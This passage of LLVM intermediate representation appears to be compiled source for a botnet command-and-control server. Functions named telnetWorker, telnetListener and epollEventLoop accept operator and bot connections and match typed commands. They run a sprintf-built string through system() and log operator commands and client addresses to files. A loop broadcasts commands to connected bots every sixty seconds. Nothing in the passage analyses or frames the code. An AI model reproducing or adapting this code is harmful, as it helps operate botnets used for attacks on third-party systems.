  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.175, i64 0, i64 0), i64 74, i32 1, i1 false)
  %919 = call i64 @strlen(i8* nonnull %97) #9
  %920 = call i64 @send(i32 %93, i8* nonnull %97, i64 %919, i32 16384) #10
  %921 = icmp eq i64 %920, -1
  br i1 %921, label %.loopexit209.loopexit, label %922

; <label>:922:                                    ; preds = %915, %918
  %923 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.176, i64 0, i64 0)) #9
  %924 = icmp eq i8* %923, null
  br i1 %924, label %925, label %928

; <label>:925:                                    ; preds = %922
  %926 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.177, i64 0, i64 0)) #9
  %927 = icmp eq i8* %926, null
  br i1 %927, label %936, label %928

; <label>:928:                                    ; preds = %925, %922
  %929 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %149, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.178, i64 0, i64 0), i8** nonnull %150, i8** nonnull %151, i8** nonnull %152) #10
  %930 = call i32 @system(i8* nonnull %149) #10
  %931 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i64 0, i64 0), i8** nonnull %150, i8** nonnull %151, i8** nonnull %152)
  %932 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i64 0, i64 0), i8** nonnull %150, i8** nonnull %151, i8** nonnull %152) #10
  %933 = call i64 @strlen(i8* nonnull %97) #9
  %934 = call i64 @send(i32 %93, i8* nonnull %97, i64 %933, i32 16384) #10
  %935 = icmp eq i64 %934, -1
  br i1 %935, label %.loopexit209.loopexit, label %936

; <label>:936:                                    ; preds = %925, %928
  %937 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.180, i64 0, i64 0)) #9
  %938 = icmp eq i8* %937, null
  br i1 %938, label %943, label %939

; <label>:939:                                    ; preds = %936
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.181, i64 0, i64 0), i64 72, i32 1, i1 false)
  %940 = call i64 @strlen(i8* nonnull %97) #9
  %941 = call i64 @send(i32 %93, i8* nonnull %97, i64 %940, i32 16384) #10
  %942 = icmp eq i64 %941, -1
  br i1 %942, label %.loopexit209.loopexit, label %943

; <label>:943:                                    ; preds = %936, %939
  %944 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i64 0, i64 0)) #9
  %945 = icmp eq i8* %944, null
  br i1 %945, label %950, label %946

; <label>:946:                                    ; preds = %943
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.183, i64 0, i64 0), i64 71, i32 1, i1 false)
  %947 = call i64 @strlen(i8* nonnull %97) #9
  %948 = call i64 @send(i32 %93, i8* nonnull %97, i64 %947, i32 16384) #10
  %949 = icmp eq i64 %948, -1
  br i1 %949, label %.loopexit209.loopexit, label %950

; <label>:950:                                    ; preds = %943, %946
  %951 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.184, i64 0, i64 0)) #9
  %952 = icmp eq i8* %951, null
  br i1 %952, label %957, label %953

; <label>:953:                                    ; preds = %950
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.185, i64 0, i64 0), i64 76, i32 1, i1 false)
  %954 = call i64 @strlen(i8* nonnull %97) #9
  %955 = call i64 @send(i32 %93, i8* nonnull %97, i64 %954, i32 16384) #10
  %956 = icmp eq i64 %955, -1
  br i1 %956, label %.loopexit209.loopexit, label %957

; <label>:957:                                    ; preds = %950, %953
  %958 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.186, i64 0, i64 0)) #9
  %959 = icmp eq i8* %958, null
  br i1 %959, label %964, label %960

; <label>:960:                                    ; preds = %957
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.187, i64 0, i64 0), i64 71, i32 1, i1 false)
  %961 = call i64 @strlen(i8* nonnull %97) #9
  %962 = call i64 @send(i32 %93, i8* nonnull %97, i64 %961, i32 16384) #10
  %963 = icmp eq i64 %962, -1
  br i1 %963, label %.loopexit209.loopexit, label %964

; <label>:964:                                    ; preds = %957, %960
  %965 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.188, i64 0, i64 0)) #9
  %966 = icmp eq i8* %965, null
  br i1 %966, label %971, label %967

; <label>:967:                                    ; preds = %964
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.189, i64 0, i64 0), i64 80, i32 1, i1 false)
  %968 = call i64 @strlen(i8* nonnull %97) #9
  %969 = call i64 @send(i32 %93, i8* nonnull %97, i64 %968, i32 16384) #10
  %970 = icmp eq i64 %969, -1
  br i1 %970, label %.loopexit209.loopexit, label %971

; <label>:971:                                    ; preds = %964, %967
  %972 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i64 0, i64 0)) #9
  %973 = icmp eq i8* %972, null
  br i1 %973, label %978, label %974

; <label>:974:                                    ; preds = %971
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.191, i64 0, i64 0), i64 73, i32 1, i1 false)
  %975 = call i64 @strlen(i8* nonnull %97) #9
  %976 = call i64 @send(i32 %93, i8* nonnull %97, i64 %975, i32 16384) #10
  %977 = icmp eq i64 %976, -1
  br i1 %977, label %.loopexit209.loopexit, label %978

; <label>:978:                                    ; preds = %971, %974
  %979 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.192, i64 0, i64 0)) #9
  %980 = icmp eq i8* %979, null
  br i1 %980, label %985, label %981

; <label>:981:                                    ; preds = %978
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.193, i64 0, i64 0), i64 75, i32 1, i1 false)
  %982 = call i64 @strlen(i8* nonnull %97) #9
  %983 = call i64 @send(i32 %93, i8* nonnull %97, i64 %982, i32 16384) #10
  %984 = icmp eq i64 %983, -1
  br i1 %984, label %.loopexit209.loopexit, label %985

; <label>:985:                                    ; preds = %978, %981
  %986 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.194, i64 0, i64 0)) #9
  %987 = icmp eq i8* %986, null
  br i1 %987, label %992, label %988

; <label>:988:                                    ; preds = %985
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.195, i64 0, i64 0), i64 71, i32 1, i1 false)
  %989 = call i64 @strlen(i8* nonnull %97) #9
  %990 = call i64 @send(i32 %93, i8* nonnull %97, i64 %989, i32 16384) #10
  %991 = icmp eq i64 %990, -1
  br i1 %991, label %.loopexit209.loopexit, label %992

; <label>:992:                                    ; preds = %985, %988
  %993 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i64 0, i64 0)) #9
  %994 = icmp eq i8* %993, null
  br i1 %994, label %999, label %995

; <label>:995:                                    ; preds = %992
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.197, i64 0, i64 0), i64 25, i32 1, i1 false)
  %996 = call i64 @strlen(i8* nonnull %97) #9
  %997 = call i64 @send(i32 %93, i8* nonnull %97, i64 %996, i32 16384) #10
  %998 = icmp eq i64 %997, -1
  br i1 %998, label %.loopexit209.loopexit, label %999

; <label>:999:                                    ; preds = %992, %995
  %1000 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.198, i64 0, i64 0)) #9
  %1001 = icmp eq i8* %1000, null
  br i1 %1001, label %1006, label %1002

; <label>:1002:                                   ; preds = %999
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.199, i64 0, i64 0), i64 25, i32 1, i1 false)
  %1003 = call i64 @strlen(i8* nonnull %97) #9
  %1004 = call i64 @send(i32 %93, i8* nonnull %97, i64 %1003, i32 16384) #10
  %1005 = icmp eq i64 %1004, -1
  br i1 %1005, label %.loopexit209.loopexit, label %1006

; <label>:1006:                                   ; preds = %999, %1002
  %1007 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.200, i64 0, i64 0)) #9
  %1008 = icmp eq i8* %1007, null
  br i1 %1008, label %1009, label %.loopexit210

; <label>:1009:                                   ; preds = %1006
  %1010 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.201, i64 0, i64 0)) #9
  %1011 = icmp eq i8* %1010, null
  br i1 %1011, label %1012, label %.loopexit210

; <label>:1012:                                   ; preds = %1009
  %1013 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.202, i64 0, i64 0)) #9
  %1014 = icmp eq i8* %1013, null
  br i1 %1014, label %1015, label %.loopexit210

; <label>:1015:                                   ; preds = %1012
  %1016 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.203, i64 0, i64 0)) #9
  %1017 = icmp eq i8* %1016, null
  br i1 %1017, label %1018, label %.loopexit210

; <label>:1018:                                   ; preds = %1015
  %1019 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.204, i64 0, i64 0)) #9
  %1020 = icmp eq i8* %1019, null
  br i1 %1020, label %1021, label %.loopexit.loopexit

; <label>:1021:                                   ; preds = %1018
  %1022 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.205, i64 0, i64 0)) #9
  %1023 = icmp eq i8* %1022, null
  br i1 %1023, label %1024, label %.loopexit.loopexit

; <label>:1024:                                   ; preds = %1021
  call void @trim(i8* nonnull %96)
  %1025 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %1026 = call i64 @strlen(i8* nonnull %97) #9
  %1027 = call i64 @send(i32 %93, i8* nonnull %97, i64 %1026, i32 16384) #10
  %1028 = icmp eq i64 %1027, -1
  br i1 %1028, label %.loopexit.loopexit, label %1029

; <label>:1029:                                   ; preds = %1024
  %1030 = call i64 @strlen(i8* nonnull %96) #9
  %1031 = icmp eq i64 %1030, 0
  br i1 %1031, label %.backedge, label %1032

; <label>:1032:                                   ; preds = %1029
  %1033 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %1034 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %1035 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1034, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %1036 = call i32 @fclose(%struct._IO_FILE* %1034)
  call void @broadcast(i8* nonnull %96, i32 undef, i8* undef)
  call void @llvm.memset.p0i8.i64(i8* nonnull %96, i8 0, i64 2048, i32 16, i1 false)
  br label %.backedge

.backedge:                                        ; preds = %1032, %351, %397, %448, %514, %556, %664, %718, %1029
  %1037 = call i32 @fdgets(i8* nonnull %96, i32 2048, i32 %93)
  %1038 = icmp sgt i32 %1037, 0
  br i1 %1038, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %1021, %1018, %.backedge, %1024, %718, %714, %710, %706, %702, %698, %694, %690, %685, %664, %660, %656, %652, %648, %644, %640, %636, %632, %628, %624, %620, %616, %612, %608, %604, %600, %596, %592, %588, %584, %580, %576, %571, %556, %552, %548, %544, %540, %535, %514, %510, %506, %502, %498, %494, %490, %486, %482, %478, %474, %470, %466, %448, %444, %440, %436, %432, %428, %424, %420, %415, %397, %393, %389, %385, %381, %377, %373, %369, %351, %347, %343, %339, %335, %331, %327, %323, %319, %315, %311, %307
  br label %.loopexit

.loopexit.loopexit313:                            ; preds = %277, %272, %268, %264, %260, %257, %254, %.loopexit210
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit313, %.loopexit.loopexit, %140, %245, %241, %231, %133, %129, %118, %114, %._crit_edge, %746, %735, %727, %249
  %sext = shl i64 %92, 32
  %1039 = ashr exact i64 %sext, 32
  %1040 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1039, i32 1
  store i32 0, i32* %1040, align 4
  %1041 = call i32 @close(i32 %93) #10
  %1042 = load volatile i32, i32* @managesConnected, align 4
  %1043 = add nsw i32 %1042, -1
  store volatile i32 %1043, i32* @managesConnected, align 4
  br label %.loopexit209

.loopexit209.loopexit:                            ; preds = %757, %764, %771, %784, %804, %820, %827, %834, %841, %848, %855, %862, %869, %876, %883, %890, %897, %904, %911, %918, %928, %939, %946, %953, %960, %967, %974, %981, %988, %995, %1002
  br label %.loopexit209

.loopexit209:                                     ; preds = %.loopexit209.loopexit, %.loopexit
  ret i8* null
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fgetc(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @rewind(%struct._IO_FILE* nocapture) local_unnamed_addr #3

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #3

declare i32 @resolve(...) local_unnamed_addr #1

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @telnetListener(i32) #5 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca { i64, i64 }, align 8
  %tmpcast = bitcast { i64, i64 }* %4 to %struct.sockaddr_in*
  %5 = alloca i64, align 8
  %6 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  %7 = icmp slt i32 %6, 0
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.207, i64 0, i64 0)) #12
  br label %9

; <label>:9:                                      ; preds = %8, %1
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 3, i64 0
  %11 = bitcast i8* %10 to i64*
  store i64 0, i64* %11, align 4
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  store i32 0, i32* %13, align 4
  %14 = trunc i32 %0 to i16
  %15 = tail call zeroext i16 @htons(i16 zeroext %14) #11
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %15, i16* %16, align 2
  %17 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %18 = call i32 @bind(i32 %6, %struct.sockaddr* nonnull %17, i32 16) #10
  %19 = icmp slt i32 %18, 0
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %9
  call void @perror(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.208, i64 0, i64 0)) #12
  br label %21

; <label>:21:                                     ; preds = %20, %9
  %22 = call i32 @listen(i32 %6, i32 5) #10
  store i32 16, i32* %2, align 4
  %23 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i64 0, i32 0
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %tmpcast, i64 0, i32 2, i32 0
  %25 = bitcast { i64, i64 }* %4 to %struct.sockaddr*
  br label %26

; <label>:26:                                     ; preds = %42, %21
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.209, i64 0, i64 0))
  %28 = load i64, i64* %23, align 8
  call void @client_addr(i64 %28, i64 undef)
  %29 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.210, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %30 = load i32, i32* %24, align 4
  %31 = and i32 %30, 255
  %32 = lshr i32 %30, 8
  %33 = and i32 %32, 255
  %34 = lshr i32 %30, 16
  %35 = and i32 %34, 255
  %36 = lshr i32 %30, 24
  %37 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %29, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.211, i64 0, i64 0), i32 %31, i32 %33, i32 %35, i32 %36)
  %38 = call i32 @fclose(%struct._IO_FILE* %29)
  %39 = call i32 @accept(i32 %6, %struct.sockaddr* nonnull %25, i32* nonnull %2) #10
  %40 = icmp slt i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %26
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.212, i64 0, i64 0)) #12
  br label %42

; <label>:42:                                     ; preds = %41, %26
  %43 = sext i32 %39 to i64
  %44 = inttoptr i64 %43 to i8*
  %45 = call i32 @pthread_create(i64* nonnull %5, %union.pthread_attr_t* null, i8* (i8*)* nonnull @telnetWorker, i8* %44) #10
  br label %26
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture readonly, i8** nocapture readnone) local_unnamed_addr #0 {
  %4 = alloca %struct.epoll_event, align 4
  %5 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #10
  %6 = icmp eq i32 %0, 4
  br i1 %6, label %11, label %7

; <label>:7:                                      ; preds = %3
  %8 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %9 = load i8*, i8** %1, align 8
  %10 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %8, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.213, i64 0, i64 0), i8* %9) #12
  tail call void @exit(i32 1) #13
  unreachable

; <label>:11:                                     ; preds = %3
  %12 = getelementptr inbounds i8*, i8** %1, i64 3
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 @atoi(i8* %13) #9
  %15 = getelementptr inbounds i8*, i8** %1, i64 2
  %16 = load i8*, i8** %15, align 8
  %17 = tail call i32 @atoi(i8* %16) #9
  %18 = icmp sgt i32 %17, 1000
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %11
  %puts13 = tail call i32 @puts(i8* getelementptr inbounds ([86 x i8], [86 x i8]* @str.1, i64 0, i64 0))
  ret i32 0

; <label>:20:                                     ; preds = %11
  %puts = tail call i32 @puts(i8* getelementptr inbounds ([110 x i8], [110 x i8]* @str, i64 0, i64 0))
  %21 = getelementptr inbounds i8*, i8** %1, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = tail call fastcc i32 @create_and_bind(i8* %22)
  store volatile i32 %23, i32* @listenFD, align 4
  %24 = load volatile i32, i32* @listenFD, align 4
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %26, label %27

; <label>:26:                                     ; preds = %20
  tail call void @abort() #13
  unreachable

; <label>:27:                                     ; preds = %20
  %28 = load volatile i32, i32* @listenFD, align 4
  %29 = tail call fastcc i32 @make_socket_non_blocking(i32 %28)
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  tail call void @abort() #13
  unreachable

; <label>:32:                                     ; preds = %27
  %33 = load volatile i32, i32* @listenFD, align 4
  %34 = tail call i32 @listen(i32 %33, i32 128) #10
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %32
  tail call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.216, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:37:                                     ; preds = %32
  %38 = tail call i32 @epoll_create1(i32 0) #10
  store volatile i32 %38, i32* @epollFD, align 4
  %39 = load volatile i32, i32* @epollFD, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %37
  tail call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.217, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:42:                                     ; preds = %37
  %43 = load volatile i32, i32* @listenFD, align 4
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 1
  %45 = bitcast %union.epoll_data* %44 to i32*
  store i32 %43, i32* %45, align 4
  %46 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 0
  store i32 -2147483647, i32* %46, align 4
  %47 = load volatile i32, i32* @epollFD, align 4
  %48 = load volatile i32, i32* @listenFD, align 4
  %49 = call i32 @epoll_ctl(i32 %47, i32 1, i32 %48, %struct.epoll_event* nonnull %4) #10
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %42
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0)) #12
  call void @abort() #13
  unreachable

; <label>:52:                                     ; preds = %42
  %53 = add nsw i32 %17, 2
  %54 = zext i32 %53 to i64
  %55 = alloca i64, i64 %54, align 16
  %56 = icmp eq i32 %17, 0
  br i1 %56, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %52
  %57 = sext i32 %17 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %57, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %58 = getelementptr inbounds i64, i64* %55, i64 %indvars.iv
  %59 = call i32 @pthread_create(i64* %58, %union.pthread_attr_t* null, i8* (i8*)* nonnull @epollEventLoop, i8* null) #10
  %60 = trunc i64 %indvars.iv.next to i32
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %52
  %62 = sext i32 %14 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = call i32 @pthread_create(i64* nonnull %55, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %63) #10
  br label %65

; <label>:65:                                     ; preds = %65, %._crit_edge
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 undef, i8* undef)
  %66 = call i32 @sleep(i32 60) #10
  br label %65
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #8

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @create_and_bind(i8*) unnamed_addr #0 {
  %2 = alloca %struct.addrinfo, align 8
  %3 = alloca %struct.addrinfo*, align 8
  %4 = alloca i32, align 4
  %5 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 2
  %6 = bitcast %struct.addrinfo* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %6, i8 0, i64 48, i32 8, i1 false)
  store i32 1, i32* %5, align 8
  %7 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 0
  store i32 1, i32* %7, align 8
  %8 = call i32 @getaddrinfo(i8* null, i8* %0, %struct.addrinfo* nonnull %2, %struct.addrinfo** nonnull %3) #10
  %9 = icmp eq i32 %8, 0
  br i1 %9, label %.preheader, label %12

.preheader:                                       ; preds = %1
  %.01719 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  %10 = icmp eq %struct.addrinfo* %.01719, null
  br i1 %10, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %11 = bitcast i32* %4 to i8*
  br label %16

; <label>:12:                                     ; preds = %1
  %13 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %14 = call i8* @gai_strerror(i32 %8) #10
  %15 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %13, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.220, i64 0, i64 0), i8* %14) #12
  br label %45

; <label>:16:                                     ; preds = %.lr.ph, %38
  %.01720 = phi %struct.addrinfo* [ %.01719, %.lr.ph ], [ %.017, %38 ]
  %17 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 1
  %18 = load i32, i32* %17, align 4
  %19 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 2
  %20 = load i32, i32* %19, align 8
  %21 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 3
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @socket(i32 %18, i32 %20, i32 %22) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %38, label %25

; <label>:25:                                     ; preds = %16
  store i32 1, i32* %4, align 4
  %26 = call i32 @setsockopt(i32 %23, i32 1, i32 2, i8* nonnull %11, i32 4) #10
  %27 = icmp eq i32 %26, -1
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %25
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.221, i64 0, i64 0)) #12
  br label %29

; <label>:29:                                     ; preds = %28, %25
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 5
  %31 = load %struct.sockaddr*, %struct.sockaddr** %30, align 8
  %32 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 4
  %33 = load i32, i32* %32, align 8
  %34 = call i32 @bind(i32 %23, %struct.sockaddr* %31, i32 %33) #10
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %43, label %36

; <label>:36:                                     ; preds = %29
  %37 = call i32 @close(i32 %23) #10
  br label %38

; <label>:38:                                     ; preds = %16, %36
  %39 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 7
  %.017 = load %struct.addrinfo*, %struct.addrinfo** %39, align 8
  %40 = icmp eq %struct.addrinfo* %.017, null
  br i1 %40, label %._crit_edge.loopexit, label %16

._crit_edge.loopexit:                             ; preds = %38
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %41 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %42 = call i64 @fwrite(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.222, i64 0, i64 0), i64 15, i64 1, %struct._IO_FILE* %41) #12
  br label %45

; <label>:43:                                     ; preds = %29
  %44 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  call void @freeaddrinfo(%struct.addrinfo* %44) #10
  br label %45

; <label>:45:                                     ; preds = %43, %._crit_edge, %12
  %.018 = phi i32 [ -1, %12 ], [ -1, %._crit_edge ], [ %23, %43 ]
  ret i32 %.018
}

; Function Attrs: noreturn nounwind
declare void @abort() local_unnamed_addr #8

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) local_unnamed_addr #3

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) local_unnamed_addr #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #9

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: nounwind
declare i32 @puts(i8* nocapture readonly) #10

; Function Attrs: nounwind
